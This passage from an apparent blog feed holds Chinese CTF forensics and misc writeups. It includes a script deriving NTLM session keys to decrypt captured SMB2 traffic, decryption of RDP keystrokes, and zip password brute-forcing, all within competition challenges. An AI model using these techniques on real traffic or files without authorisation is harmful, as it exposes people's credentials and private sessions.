hash1.digest()</span><br><span class="line">password = args.hash.decode(&#x27;hex&#x27;)</span><br><span class="line"></span><br><span class="line">#Calculate the ResponseNTKey</span><br><span class="line">h = hmac.new(password, digestmod=hashlib.md5)</span><br><span class="line">h.update(user+domain)</span><br><span class="line">respNTKey = h.digest()</span><br><span class="line"></span><br><span class="line">#Use NTProofSTR and ResponseNTKey to calculate Key Excahnge Key</span><br><span class="line">NTproofStr = args.ntproofstr.decode(&#x27;hex&#x27;)</span><br><span class="line">h = hmac.new(respNTKey, digestmod=hashlib.md5)</span><br><span class="line">h.update(NTproofStr)</span><br><span class="line">KeyExchKey = h.digest()</span><br><span class="line"></span><br><span class="line">#Calculate the Random Session Key by decrypting Encrypted Session Key with Key Exchange Key via RC4</span><br><span class="line">RsessKey = generateEncryptedSessionKey(KeyExchKey,args.key.decode(&#x27;hex&#x27;))</span><br><span class="line"></span><br><span class="line">if args.verbose:</span><br><span class="line">    print &quot;USER WORK: &quot; + user + &quot;&quot; + domain</span><br><span class="line">    print &quot;PASS HASH: &quot; + password.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;RESP NT:   &quot; + respNTKey.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;NT PROOF:  &quot; + NTproofStr.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;KeyExKey:  &quot; + KeyExchKey.encode(&#x27;hex&#x27;)    </span><br><span class="line">print &quot;Random SK: &quot; + RsessKey.encode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805766582-1bce6541-8386-45c9-9760-36039876d46a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再找到session id，以大端序排列，在wireshark中导入，解密smb2流量</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805766404-fc9ad449-b288-49c4-8fa4-546edf2eba15.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>导出smb2传输的文件，一个需要密码的flag.7z，还有远程桌面连接的私钥文件LOCAL_MACHINE_Remote_Desktop_0_DESKTOP-J0EE9MR.pfx</p><p>接下来是解密RDP流量，其中pfx需要密码，经过查询不难猜得这里的密码是mimikatz，成功解密RDP流量</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805766346-65ab08d5-1af7-4ebf-964a-b449e4ccce11.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>后面也许有更好的办法，但这里我是手动提取的。</p><p>用rdp.fastpath.scancode.keycode过滤出记录了按键的流量</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805766947-5e0204f8-bdeb-4e5f-9729-df08598b8c7d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>展开下面的RDP，可以看到每个流都记录了一个keycode</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805766930-ade97052-ebc8-4584-904b-55bd506cccdd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里我手动把每一个keycode提取了出来，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1c 0x14 0x23 0x12 0x2a 0x39 0x08 0x2c 0x39 0x19 0x1e 0x1f 0x1f 0x11 0x18 0x13 0x20 0x39 0x17 0x1f 0x39 0x21 0x28 0x2a 0x1a 0x11 0x17 0x31 0x20 0x18 0x11 0x1f 0x2a 0x0c 0x19 0x1e 0x1f 0x1f 0x11 0x18 0x13 0x20 0x2a 0x1b 0x0a 0x04 0x05 0x08 0x0b 0x02 0x04 0x02 0x09 0x03 0x28 0x1d 0x1f</span><br></pre></td></tr></table></figure><p>将其转换成对应的按键，去除一些行为艺术的按键，可以得到如下一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the 7z password is windowspassword9347013182</span><br></pre></td></tr></table></figure><p>因此密码就是babygirl2339347013182，解压得flag</p><p>flag{fa32a0b2-dc26-41f9-a5cc-1a48ca7b2ddd}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BuildCTF2024 Writeup</title>
      <link href="/posts/f0c8bac7/"/>
      <url>/posts/f0c8bac7/</url>
      
        <content type="html"><![CDATA[<p>花了一晚上简单看了看，一眼看不出来的就没做，所以就做了这么点题，wp比较潦草。。。</p><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/BuildCTF2024Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BuildCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态2024 初赛Misc Writeup+复现</title>
      <link href="/posts/420d4aeb/"/>
      <url>/posts/420d4aeb/</url>
      
        <content type="html"><![CDATA[<h2 id="writeup部分">Writeup部分</h2><h3 id="crypto">Crypto</h3><h4 id="xor">Xor</h4><p>签到题</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021145506092.png"alt="image-20241021145506092" /><figcaption aria-hidden="true">image-20241021145506092</figcaption></figure><h3 id="misc">Misc</h3><h4 id="ezflag">ezflag</h4><p>追踪一下tcp流，一眼看到pk，得知是传了一个压缩包，提取出来</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021153738034.png"alt="image-20241021153738034" /><figcaption aria-hidden="true">image-20241021153738034</figcaption></figure><p>解压出来的flag.zip没法解压，丢进010看一下，发现这其实是个png</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021153943922.png"alt="image-20241021153943922" /><figcaption aria-hidden="true">image-20241021153943922</figcaption></figure><p>改后缀名为.png即可看到flag</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021154025231.png"alt="image-20241021154025231" /><figcaption aria-hidden="true">image-20241021154025231</figcaption></figure><h4 id="pvz">Pvz</h4><p>提示说压缩包密码是pvz图中消耗阳光数的md5值，懒得去算，直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_passwords</span>(<span class="params">zip_file_path, start, end,tar</span>):</span><br><span class="line">    <span class="keyword">with</span> pyzipper.AESZipFile(zip_file_path, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">            password = md5_hash(number)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                zip_ref.extractall(path=tar,pwd=password.encode())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;成功找到密码: <span class="subst">&#123;number&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">zip_file_path = <span class="string">&#x27;attachment\\how much.zip&#x27;</span></span><br><span class="line">ta=<span class="string">&#x27;attachment&#x27;</span></span><br><span class="line">start_number = <span class="number">100</span></span><br><span class="line">end_number = <span class="number">5000</span></span><br><span class="line">try_passwords(zip_file_path, start_number, end_number,ta)</span><br></pre></td></tr></table></figure><p>正确的答案是738</p><p>解压出来一个被旋转、裁剪过的二维码</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021154814455.png"alt="image-20241021154814455" /><figcaption aria-hidden="true">image-20241021154814455</figcaption></figure><p>用gimp等等软件处理一下，恢复二维码原来的状态</p><p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/屏幕截图-2024-10-19-161455.png" alt="屏幕截图-2024-10-19-161455" style="zoom: 50%;" /></p><p>扫出来一串奇怪的东西，结合文件名可以知道这是一种叫做malbolge的抽象语言</p><p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021155224782.png" alt="image-20241021155224782" style="zoom:50%;" /></p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021155431647.png"alt="image-20241021155431647" /><figcaption aria-hidden="true">image-20241021155431647</figcaption></figure><h2 id="复现部分">复现部分</h2><blockquote><p>剩下的感觉都是一些脑洞题，想不到，真的想不到。。。</p></blockquote><h3 id="misc-1">Misc</h3><h4 id="find-way-to-read-video">Find way to read video</h4><p>题目说tessa3098把一个邮件模板放在了一个公共平台上。经过寻找，我们可以在gitcode上找到要找的东西。</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021160529550.png"alt="image-20241021160529550" /><figcaption aria-hidden="true">image-20241021160529550</figcaption></figure><p>这是一个垃圾邮件隐写，解码可以得到一个BV号和一串看起来是sessioncookie的东西，可以直接base64解码</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021161213574.png"alt="image-20241021161213574" /><figcaption aria-hidden="true">image-20241021161213574</figcaption></figure><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021161701421.png"alt="image-20241021161701421" /><figcaption aria-hidden="true">image-20241021161701421</figcaption></figure><p>通过BV号在B站上可以搜到九十集视频，全部爬下来</p><p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021161943757.png" alt="image-20241021161943757" style="zoom:50%;" /></p><blockquote><p>当时是卡在这了，注意到了视频上移动的小白点，但不知道要干什么</p></blockquote><p>预期解没看懂，但是有一种方法看懂了。base解码得到的那一堆十六进制数，经过尝试可以发现是不同字符的哈希值头几位，写脚本还原一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">fhl=[<span class="string">&quot;252f10c&quot;</span>,<span class="string">&quot;acac86c&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;cd0aa98&quot;</span>,<span class="string">&quot;021fb59&quot;</span>,<span class="string">&quot;ef2d127&quot;</span>,<span class="string">&quot;6b86b27&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;2c62423&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;2c62423&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;19581e2&quot;</span>,<span class="string">&quot;6b86b27&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;3f79bb7&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;252f10c&quot;</span>,<span class="string">&quot;18ac3e7&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;4e07408&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;ef2d127&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;18ac3e7&quot;</span>,<span class="string">&quot;d10b36a&quot;</span>,<span class="string">&quot;01ba471&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;a318c24&quot;</span>,<span class="string">&quot;087d80f&quot;</span>,<span class="string">&quot;6b23c0d&quot;</span>,<span class="string">&quot;e596a8e&quot;</span>,<span class="string">&quot;18f5384&quot;</span>,<span class="string">&quot;e7f6c01&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;7a4a4b5&quot;</span>,<span class="string">&quot;ba5ec51&quot;</span>]</span><br><span class="line">ls=string.printable</span><br><span class="line"><span class="built_in">dict</span>=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">    ha=hashlib.sha256(i.encode()).hexdigest()</span><br><span class="line">    pre=ha[:<span class="number">7</span>]</span><br><span class="line">    <span class="built_in">dict</span>[pre]=i</span><br><span class="line">msg=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fhl:</span><br><span class="line">    ch=<span class="built_in">dict</span>.get(i)</span><br><span class="line">    <span class="keyword">if</span> ch:</span><br><span class="line">        msg+=ch</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021163128597.png"alt="image-20241021163128597" /><figcaption aria-hidden="true">image-20241021163128597</figcaption></figure><h4 id="streaming">Streaming</h4><p>追踪一下udp流，可以看到是在传一个h264视频</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021163507342.png"alt="image-20241021163507342" /><figcaption aria-hidden="true">image-20241021163507342</figcaption></figure><p>右键decode as改为rtp</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021163552917.png"alt="image-20241021163552917" /><figcaption aria-hidden="true">image-20241021163552917</figcaption></figure><p>可以看到DynamicRTP-Type-96，打开编辑-首选项，找到H.264，填入96</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021163721533.png"alt="image-20241021163721533" /><figcaption aria-hidden="true">image-20241021163721533</figcaption></figure><p>下载lua插件，提取H264视频</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021163809591.png"alt="image-20241021163809591" /><figcaption aria-hidden="true">image-20241021163809591</figcaption></figure><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021163825827.png"alt="image-20241021163825827" /><figcaption aria-hidden="true">image-20241021163825827</figcaption></figure><p>用milkplayer播放一下，可以看到第一段flag以及一个hint</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021164035877.png"alt="image-20241021164035877" /><figcaption aria-hidden="true">image-20241021164035877</figcaption></figure><blockquote><p>当时是卡在了这，知道肯定是要用这个flag1做某种key去解密另一个文件，但是试了半天都不对。。。又是一个脑洞</p></blockquote><p>实际上这里是要先进行异或ff，然后再进行AES解密。（不知道怎么想到的。。。）</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021182144527.png"alt="image-20241021182144527" /><figcaption aria-hidden="true">image-20241021182144527</figcaption></figure><p>解压出来两个没有后缀的文件，其中一个用trid识别出来是png，用<ahref="https://github.com/GGN-2015/macos_shadow_tank?tab=readme-ov-file">这个项目</a>在linux下提取一下得到第二段flag</p><p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021190938509.png" alt="image-20241021190938509" style="zoom:50%;" /></p><p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021191008647.png" alt="image-20241021191008647" style="zoom:50%;" /></p><p>另一个文件用010打开发现又是H264视频，照着之前的264文件在前面补3个00</p><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021192709223.png"alt="image-20241021192709223" /><figcaption aria-hidden="true">image-20241021192709223</figcaption></figure><p>播放后发现是黑白帧的交替，转换成01二进制串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">vc=cv2.VideoCapture(<span class="string">&quot;C:\\Users\\jyzho\\Desktop\\s4cret.264&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    ret,frame=vc.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    gf=cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY)</span><br><span class="line">    <span class="keyword">if</span> cv2.countNonZero(gf):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;0&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021193450835.png"alt="image-20241021193450835" /><figcaption aria-hidden="true">image-20241021193450835</figcaption></figure><p>flag{3b3a9c08-88c4-4d65-b59e-13891ba324da}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 强网拟态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟训练合集（需要密码）</title>
      <link href="/posts/301602e1/"/>
      <url>/posts/301602e1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="44c1b800947cbbbf7e77a615dc7079c2d94b1321632527c28da03ff7d954dce8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御宛杯2024 Writeup</title>
      <link href="/posts/4d648da/"/>
      <url>/posts/4d648da/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/御宛杯2024Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 御宛杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2024 部分Writeup+复现</title>
      <link href="/posts/247dd771/"/>
      <url>/posts/247dd771/</url>
      
        <content type="html"><![CDATA[<blockquote><p>废了，只会签到，好好复现吧</p></blockquote><h2 id="writeup">Writeup</h2><h3 id="misc">Misc</h3><h4 id="fixlt">Fixlt</h4><p>拿到一个文本文档，查看内容是 css 样式，搭配 html渲染一下，得到如下内容。</p><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241001173815118.png"alt="image-20241001173815118" /><figcaption aria-hidden="true">image-20241001173815118</figcaption></figure><p>鼠标移上去，变成了aztec码的样子，但是不是很好扫，得写脚本处理一下，大概就是把除白色以外的所有像素点涂黑，然后再把横向和纵向黑色像素点间间距为1或2的部分涂黑</p><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241001173906121.png"alt="image-20241001173906121" /><figcaption aria-hidden="true">image-20241001173906121</figcaption></figure><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241001173919320.png"alt="image-20241001173919320" /><figcaption aria-hidden="true">image-20241001173919320</figcaption></figure><p>随便找个解码器扫一下就行</p><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241001174008179.png"alt="image-20241001174008179" /><figcaption aria-hidden="true">image-20241001174008179</figcaption></figure><h2 id="复现">复现</h2><h3 id="misc-1">Misc</h3><h4 id="terraworld">TerraWorld</h4><p>对wld文件strings可以直接找到六个压缩包的密码</p><p><img src="/images/SCTF2024-部分Writeup-复现/image-20241002131518727.png" alt="image-20241002131518727" style="zoom:50%;" /></p><p>对每个图片取中间十行像素上下拼接起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">image_filenames = [<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(i).zfill(<span class="number">2</span>)&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(image_filenames[<span class="number">0</span>]) <span class="keyword">as</span> img:</span><br><span class="line">    width, height = img.size</span><br><span class="line"></span><br><span class="line">middle_start = (height - <span class="number">10</span>) // <span class="number">2</span></span><br><span class="line">middle_end = middle_start + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">cropped_images = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> image_filenames:</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(filename) <span class="keyword">as</span> img:</span><br><span class="line">        cropped_img = img.crop((<span class="number">0</span>, middle_start, width, middle_end))</span><br><span class="line">        cropped_images.append(cropped_img)</span><br><span class="line"></span><br><span class="line">total_height = <span class="built_in">sum</span>(img.height <span class="keyword">for</span> img <span class="keyword">in</span> cropped_images)</span><br><span class="line"></span><br><span class="line">result_image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, total_height))</span><br><span class="line"></span><br><span class="line">current_y_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> cropped_images:</span><br><span class="line">    result_image.paste(img, (<span class="number">0</span>, current_y_offset))</span><br><span class="line">    current_y_offset += img.height</span><br><span class="line"></span><br><span class="line">result_image.save(<span class="string">&quot;combined_image.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;图像拼接完成，新图像已保存为 combined_image.png&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_images_vertically</span>(<span class="params">image_filenames, output_filename</span>):</span><br><span class="line"></span><br><span class="line">    images = [Image.<span class="built_in">open</span>(filename) <span class="keyword">for</span> filename <span class="keyword">in</span> image_filenames]</span><br><span class="line"></span><br><span class="line">    widths = <span class="built_in">set</span>([img.width <span class="keyword">for</span> img <span class="keyword">in</span> images])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(widths) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;所有图像必须具有相同的宽度&quot;</span>)</span><br><span class="line"></span><br><span class="line">    total_height = <span class="built_in">sum</span>(img.height <span class="keyword">for</span> img <span class="keyword">in</span> images)</span><br><span class="line"></span><br><span class="line">    new_image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (images[<span class="number">0</span>].width, total_height))</span><br><span class="line"></span><br><span class="line">    current_y_offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> images:</span><br><span class="line">        new_image.paste(img, (<span class="number">0</span>, current_y_offset))</span><br><span class="line">        current_y_offset += img.height</span><br><span class="line"></span><br><span class="line">    new_image.save(output_filename)</span><br><span class="line"></span><br><span class="line">image_filenames = [<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>)]  <span class="comment"># 从1.png到6.png</span></span><br><span class="line"></span><br><span class="line">output_filename = <span class="string">&quot;stacked_image.png&quot;</span></span><br><span class="line"></span><br><span class="line">stack_images_vertically(image_filenames, output_filename)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;图像拼接完成，新图像已保存为 <span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到这样一张图片</p><p><img src="/images/SCTF2024-部分Writeup-复现/image-20241002134548945.png" alt="image-20241002134548945" style="zoom:50%;" /></p><p>但是由于出题人的失误，以上都没有用</p><p>用010看wld文件，可以发现里面还藏了第二个地图文件</p><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002134813182.png"alt="image-20241002134813182" /><figcaption 